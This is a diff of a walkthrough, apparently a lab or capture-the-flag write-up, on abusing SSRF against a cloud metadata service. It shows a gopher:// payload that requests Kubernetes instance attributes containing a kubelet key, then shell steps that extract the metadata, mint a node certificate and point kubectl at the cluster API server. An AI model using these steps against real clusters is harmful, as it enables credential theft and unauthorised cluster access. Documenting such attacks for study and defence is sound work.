@@ -76,19 +76,19 @@ gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-en
 ```
 It contains "KUBELET_KEY".
 
-- ctrl+A and store all result to `metadata_exploit/metadata.txt` file
+- ctrl+A and store all result to `metadata-script/metadata.txt` file
 TODO: ADD image
 
 - store
 ```bash
-cd metadata_exploit
+cd metadata-script
 
 # Extract necessary data from metadata
 bash extract.sh
 ls -l metadata
 
 # Get node certificate
-bash exploit.sh $(cat metadata/nodename)
+bash make_cert.sh $(cat metadata/nodename)
 
 # Set env vars
 KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)"
